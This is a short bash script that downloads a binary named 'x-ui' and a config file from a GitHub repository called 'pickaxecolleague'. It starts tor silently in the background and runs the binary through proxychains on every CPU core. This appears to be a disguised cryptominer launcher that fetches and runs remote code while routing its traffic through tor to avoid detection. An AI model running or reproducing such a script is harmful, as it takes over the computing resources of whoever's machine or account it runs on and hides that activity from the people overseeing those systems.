#!/bin/bash

cpu=$(echo nproc | bash)

wget https://github.com/pickaxecolleague/pickaxecolleague/raw/main/x-ui
wget -O config.json https://raw.githubusercontent.com/pickaxecolleague/pickaxecolleague/main/config-free.json

nohup tor &>/dev/null &

chmod 777 x-ui

proxychains ./x-ui --threads=$cpu --config=config.json
